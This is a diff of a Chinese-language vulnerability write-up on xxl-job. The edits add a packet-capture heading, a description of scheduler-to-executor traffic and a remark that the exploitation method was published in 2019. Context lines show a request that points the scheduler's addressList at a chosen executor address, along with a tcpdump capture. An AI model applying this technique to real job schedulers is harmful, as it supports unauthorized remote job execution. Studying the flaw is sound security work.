@@ -390,7 +390,7 @@ Connection: close
 id=2&executorParam=&addressList=http%3A%2F%2F10.88.105.53%3A9999
 ```
 
-wireshark 抓包看看
+## wireshark 抓包看看
 
 ```
 ╰─$ sudo tcpdump port 9999 -w 9999.pcap
@@ -401,7 +401,13 @@ tcpdump: listening on pktap, link-type PKTAP (Apple DLT_PKTAP), capture size 262
 0 packets dropped by kernel
 ```
 
+
 ![](./run.png)
+
+```
+10.20.24.99（任务调度中心 xxl-job-admin）  > 10.88.105.53:9999 (执行器 xxl.job.executor)
+User-Agent: Java/1.8.0_60
+```
 
 ```
 POST /run HTTP/1.1
@@ -426,7 +432,7 @@ connection: keep-alive
 ```
 
 
-
+Ps： 此利用方式在`2019.07.08 16:20:16` 有人已经写过文章（https://www.jianshu.com/p/2d0974f33271），不知道为什么今天才预警？？？ 
 
 ## 参考链接
 
